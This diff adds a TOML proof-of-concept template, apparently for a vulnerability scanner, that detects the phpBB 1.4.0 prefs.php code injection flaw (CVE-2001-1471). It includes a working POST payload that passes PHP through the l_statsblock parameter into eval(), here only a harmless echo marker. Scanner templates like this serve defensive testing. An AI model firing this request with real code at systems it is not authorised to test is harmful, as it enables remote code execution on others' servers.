@@ -1,0 +1,38 @@
+[info]
+author = "AVE"
+description = "检测 phpBB 1.4.0 及更早版本中 prefs.php 的语言参数代码注入漏洞。远程认证用户通过提交非法的 language 参数值，导致 $l_statsblock 变量未从语言文件正确初始化，攻击者可利用 GET/POST 参数直接控制该变量，随后在 page_header.php 的 eval() 中执行任意 PHP 代码。"
+id = "POC-AVE-2001-0550"
+name = "phpBB 1.4.0 prefs.php Language Parameter Code Injection PoC"
+severity = "high"
+tags = [
+    "cve-2001-1471",
+    "phpbb",
+    "code-injection",
+    "eval-injection",
+]
+vuln_id = [
+    "CVE-2001-1471",
+    "AVE-2001-0550",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/prefs.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "language=invalid&l_statsblock=echo%28%27vulnerable%27%29%3B"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["vulnerable"]
